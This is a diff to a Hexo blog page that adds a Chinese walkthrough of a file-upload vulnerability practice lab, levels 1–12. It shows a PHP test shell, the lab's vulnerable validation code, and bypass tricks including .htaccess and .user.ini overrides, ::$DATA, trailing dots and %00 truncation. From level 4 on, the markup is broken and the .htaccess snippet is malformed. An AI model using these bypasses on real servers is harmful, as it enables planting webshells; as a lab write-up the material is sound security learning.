@@ -19,7 +19,7 @@
 <meta property="og:url" content="http://example.com/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
+<meta property="article:author" content="Whirlpool">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -63,10 +63,10 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="/img/head.jpg" class="js-avatar">
+			<img src="/img/960a304e251f95caf8502419c5177f3e660952f3.png" class="js-avatar">
 		</a>
 		<hgroup>
-			<h1 class="header-author"><a href="/">John Doe</a></h1>
+			<h1 class="header-author"><a href="/">Whirlpool</a></h1>
 		</hgroup>
 		
 
@@ -144,11 +144,11 @@
 		<header id="header" class="inner">
 			<div class="profilepic">
 				<a href="/">
-					<img src="/img/head.jpg" class="js-avatar">
+					<img src="/img/960a304e251f95caf8502419c5177f3e660952f3.png" class="js-avatar">
 				</a>
 			</div>
 			<hgroup>
-			  <h1 class="header-author js-header-author">John Doe</h1>
+			  <h1 class="header-author js-header-author">Whirlpool</h1>
 			</hgroup>
 			
 			
@@ -214,7 +214,230 @@
             
 
   
-    <article id="post-文件上传漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-我的文章/文件上传漏洞实战" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="文件上传漏洞实战"><a href="#文件上传漏洞实战" class="headerlink" title="文件上传漏洞实战"></a>文件上传漏洞实战</h3><ul>
+<li>准备好上传的 shell.php文件（一句话木马）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval(&#x27;phpinfo();&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="第一关：前端JS验证"><a href="#第一关：前端JS验证" class="headerlink" title="第一关：前端JS验证"></a>第一关：前端JS验证</h4><p>先上传一个文件上去看看效果，上传失败，说不允许上传PHP文件</p>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220209121737567.png" alt="image-20220209121737567"></p>
+<p>根据弹窗</p>
+<ul>
+<li>可以得出是前端JS验证。</li>
+<li>绕过方法：禁用JS脚本。</li>
+</ul>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220209121911082.png" alt="image-20220209121911082"></p>
+<p>上传成功</p>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220209122016081.png" alt="image-20220209122016081"></p>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220209122032283.png" alt="image-20220209122032283"></p>
+<p>源码分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">         <span class="comment">// 获取文件名</span></span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">         <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">  <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">         <span class="comment">//提取上传文件的类型</span></span><br><span class="line">  <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">         <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">         <span class="comment">//通过lastIndexOf取到“.”的索引，再使用substring函数截取 .后缀名</span></span><br><span class="line">  <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">         <span class="comment">//如果 allow_ext 中没有 ext_name字符串，则返回-1</span></span><br><span class="line">    <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">    <span class="title function_ invoke__">alert</span>(errMsg);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">         <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="第二关：服务端MIME验证"><a href="#第二关：服务端MIME验证" class="headerlink" title="第二关：服务端MIME验证"></a>第二关：服务端MIME验证</h4><ul>
+<li>根据提示：本pass在服务端对数据包的MIME进行检查！</li>
+<li>绕过方法：抓包，修改一下<code>Content-Type</code>字段。</li>
+<li>Content-Type: image&#x2F;png</li>
+</ul>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220209122746814.png" alt="image-20220209122746814"></p>
+<p>上传成功。</p>
+<p>源码分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当点击鼠标上传的时候，进行验证</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">  <span class="comment">// UPLOAD_PATH 声明在配置文件上的文件上传路径，来判断路径是否存在。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">      <span class="comment">// 进行上传文件类型判断， || 或的意思</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; </span><br><span class="line">          <span class="comment">// move_uploaded_file 移动文件函数，将前者移动到后者哪里</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="第三关：黑名单绕过"><a href="#第三关：黑名单绕过" class="headerlink" title="第三关：黑名单绕过"></a>第三关：黑名单绕过</h4><ul>
+<li><p>根据提示：本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p>
+</li>
+<li><p>比较容易想的绕过方法：</p>
+</li>
+<li><ul>
+<li>大小写绕过</li>
+<li>用其他可被解析的后缀名来代替 : .phtml .phps .php5 .pht</li>
+</ul>
+</li>
+<li><p>大小写绕过失败！</p>
+</li>
+</ul>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220209123320327.png" alt="image-20220209123320327"></p>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220209123334150.png" alt="image-20220209123334150"></p>
+<ul>
+<li><p>尝试用其他后缀名</p>
+<p>phtml</p>
+<p>上传成功</p>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220209123553447.png" alt="image-20220209123553447"></p>
+</li>
+<li><p>源码分析</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">      <span class="comment">// 声明了变量 deny_ext（拒绝_后缀名）</span></span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">      <span class="comment">// trim 过滤为空的函数，替换空格。自动去除空格</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">      <span class="comment">//trim去除字符创两侧的的特殊字符</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点，xiasohuang.jpg.php 防止上传验证为jpg格式实际上是php代码。</span></span><br><span class="line">      <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      <span class="comment">// strrchr 分隔字符，就是删除掉.前面的文件名称，这样就得到了文件的真实后缀了。</span></span><br><span class="line">      <span class="comment">//取出后缀名 如：.txt</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA，将目标中的::$DATA替换为空。</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 判断接收到的文件中，有没有黑名单里面的后缀，就继续进行文件上传，如果存在就不允许上传这个格式。</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">       <span class="comment">//获取当前时间 再连接上一个随机数和后缀名，生成一个新的文件名与上传路径拼接    </span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="第四关：-htaccess绕过"><a href="#第四关：-htaccess绕过" class="headerlink" title="第四关：.htaccess绕过"></a>第四关：.htaccess绕过</h4><ul>
+<li>根据提示：</li>
+</ul>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220209123827120.png" alt="image-20220209123827120"></p>
+<ul>
+<li><p>绕过方法：</p>
+<ul>
+<li><p>首先构建.htaccess，内容为</p>
+</li>
+<li><p>~~~php</p>
+<p>&lt;FilesMatch “1”&gt;<br>Sethandler application&#x2F;x-httpd-php</p>
+</Eilesmatch >
+
+<p>&#x2F;&#x2F; FilesMatch 文件匹配 ，如果匹配到文件中存在 “1” 就会将文件以解析 application&#x2F;x-httpd-php 类型进行解析。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  - 然后上传一个1.jpg格式文件</span><br><span class="line"></span><br><span class="line">![image-20220209124508160](C:\Users\86152\Desktop\新建文件夹\image-20220209124508160.png)</span><br><span class="line"></span><br><span class="line">![image-20220209124518719](C:\Users\86152\Desktop\新建文件夹\image-20220209124518719.png)</span><br><span class="line"></span><br><span class="line">- 漏洞分析</span><br><span class="line"></span><br><span class="line">  - 这是解析漏洞 只有apache才有。</span><br><span class="line"></span><br><span class="line">  - .htaccess文件(或者&quot;分布式配置文件&quot;）,全称是Hypertext Access(超文本入口)。</span><br><span class="line"></span><br><span class="line">  - 提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</span><br><span class="line"></span><br><span class="line">  - 这个漏洞的原理就是服务器没有过滤htaccess文件的上传，而htaccess文件上传后，当前目录就会按照这个配置文件里面的内容执行。</span><br><span class="line"></span><br><span class="line">#### 第五关：.user.ini 绕过</span><br><span class="line"></span><br><span class="line">- user.ini文件构成的PHP后门</span><br><span class="line">- 根据提示：上传目录存在php文件（readme.php）</span><br><span class="line"></span><br><span class="line">- 绕过方法：</span><br><span class="line"></span><br><span class="line">- - 复写后缀名绕过</span><br><span class="line">  - 先上传`.user.ini`文件，然后再上传一个1.jpg文件，实现绕过。</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">.user.ini文件内容：</span><br><span class="line"></span><br><span class="line">auto_prepend_file=1.jpg</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">法1</span><br><span class="line"></span><br><span class="line">![image-20220209125130979](C:\Users\86152\Desktop\新建文件夹\image-20220209125130979.png)</span><br><span class="line"></span><br><span class="line">法2</span><br><span class="line"></span><br><span class="line">![image-20220209125408554](C:\Users\86152\Desktop\新建文件夹\image-20220209125408554.png)</span><br><span class="line"></span><br><span class="line">- 漏洞解析</span><br><span class="line"></span><br><span class="line">- 自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。</span><br><span class="line"></span><br><span class="line">- **想要引发 .user.ini 解析漏洞需要三个前提条件：**</span><br><span class="line"></span><br><span class="line">- - 服务器脚本语言为PHP</span><br><span class="line">  - 服务器使用CGI／FastCGI模式</span><br><span class="line">  - 上传目录下要有可执行的php文件</span><br><span class="line"></span><br><span class="line">- 先来创建一个 .user.ini 文件并写入一下内容：auto_prepend_file=x.png</span><br><span class="line"></span><br><span class="line">- 上传 .user.ini 后，再上传一个 x.png 文件，此时 x.png 文件只要有符合 php 语言的代码就会执行。</span><br><span class="line"></span><br><span class="line">#### 第六关：大小写绕过</span><br><span class="line"></span><br><span class="line">- 根据提示</span><br><span class="line"></span><br><span class="line">  ![image-20220209125722896](C:\Users\86152\Desktop\新建文件夹\image-20220209125722896.png)</span><br><span class="line"></span><br><span class="line">- 源码分析</span><br><span class="line"></span><br><span class="line">~~~php</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">    </span><br><span class="line">        // 通过源代码我们可以发现，黑名单里虽然过滤的很全面，但是在下面的后缀名处理之中却出现了纰漏，没有将后缀名转换为小写。只是将文件名转化为小写</span><br><span class="line">        </span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h4 id="第七关：空格绕过"><a href="#第七关：空格绕过" class="headerlink" title="第七关：空格绕过"></a>第七关：空格绕过</h4><ul>
+<li><p>根据提示：</p>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220210114027547.png" alt="image-20220210114027547"></p>
+</li>
+<li><p>绕过方法：</p>
+</li>
+<li><ul>
+<li>通过抓取上传数据包，修改上传的文件后缀，实现上传。</li>
+</ul>
+</li>
+<li><p>绕过原理：</p>
+</li>
+</ul>
+<p>​        在windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动删除“.”与空格，利用此特性也可以绕过黑名单验证。apache中可以利用点结尾和空格绕过，asp和aspx中可以用空格绕过。</p>
+<h4 id="第八关：点绕过"><a href="#第八关：点绕过" class="headerlink" title="第八关：点绕过"></a>第八关：点绕过</h4><ul>
+<li><p>根据提示：本pass禁止上传所有可以解析的后缀！</p>
+</li>
+<li><p>绕过方法：</p>
+</li>
+<li><ul>
+<li>通过抓取上传数据包，修改上传的文件后缀，实现上传。</li>
+</ul>
+</li>
+</ul>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220210114458151.png" alt="image-20220210114458151"></p>
+<ul>
+<li>绕过原理：</li>
+</ul>
+<p>​    在windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动删除“.”与空格，利用此特性也可以绕过黑名单验证。apache中可以利用点结尾和空格绕过，asp和aspx中可以用空格绕过。</p>
+<h4 id="第九关：-DATA绕过"><a href="#第九关：-DATA绕过" class="headerlink" title="第九关：::$DATA绕过"></a>第九关：::$DATA绕过</h4><ul>
+<li>根据提示：</li>
+</ul>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220210114637244.png" alt="image-20220210114637244"></p>
+<ul>
+<li><p>绕过方法：</p>
+</li>
+<li><ul>
+<li><p>通过抓取上传数据包，修改上传的文件后缀，实现上传。</p>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220210115211432.png" alt="image-20220210115211432"></p>
+</li>
+</ul>
+</li>
+<li><p>绕过原理：</p>
+</li>
+</ul>
+<p>源代码中没有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>
+
+<p>这一行代码</p>
+<p>而::$DATA他的目的就是不检查后缀名</p>
+<h4 id="第十关：点-空格-点绕过"><a href="#第十关：点-空格-点绕过" class="headerlink" title="第十关：点+空格+点绕过"></a>第十关：点+空格+点绕过</h4><ul>
+<li><p>根据提示：本pass只允许上传.jpg|.png|.gif后缀的文件！</p>
+</li>
+<li><p>绕过方法：</p>
+</li>
+<li><ul>
+<li>通过抓取上传数据包，修改上传的文件后缀，实现上传。</li>
+</ul>
+</li>
+</ul>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220210115737152.png" alt="image-20220210115737152"></p>
+<ul>
+<li><p>绕过原理：</p>
+<ul>
+<li><p>在windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动删除“.”与空格，利用此特性也可以绕过黑名单验证。apache中可以利用点结尾和空格绕过，asp和aspx中可以用空格绕过。</p>
+</li>
+<li><p>经过脚本一系列的处理之后原本.php. .的后缀名变成了.php. ，而由于Windows的特性，又将文件末尾的点给去除了，最终就存成.php的文件</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="第十一关：双写绕过"><a href="#第十一关：双写绕过" class="headerlink" title="第十一关：双写绕过"></a>第十一关：双写绕过</h4><ul>
+<li>根据提示：</li>
+</ul>
+<p><img src="C:\Users\86152\Desktop\新建文件夹\image-20220210124149521.png" alt="image-20220210124149521"></p>
+<ul>
+<li><p>绕过方法：</p>
+</li>
+<li><ul>
+<li>假设：将代码中的字符串里面PHP替换为空， a.php —&gt; a.</li>
+<li>如果是一次过滤：a.pphphp  —-&gt; a.php</li>
+<li>如果是循环过滤a.pphphp  —-&gt; a.</li>
+<li>那么我们就可以上传数据包中修改数据来通过：xxxxx.php. . 来进行绕过。</li>
+</ul>
+</li>
+</ul>
+<h4 id="第十二关：-00截断"><a href="#第十二关：-00截断" class="headerlink" title="第十二关：%00截断"></a>第十二关：%00截断</h4><ul>
+<li><p>根据提示：</p>
+<p>本pass上传路径可控！</p>
+</li>
+<li><p>绕过方法：</p>
+</li>
+<li><ul>
+<li>当是POST接收情况的时候，需要对 %00 做一个URL编码</li>
+<li>直接写%00也没问题。</li>
+</ul>
+</li>
+</ul>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
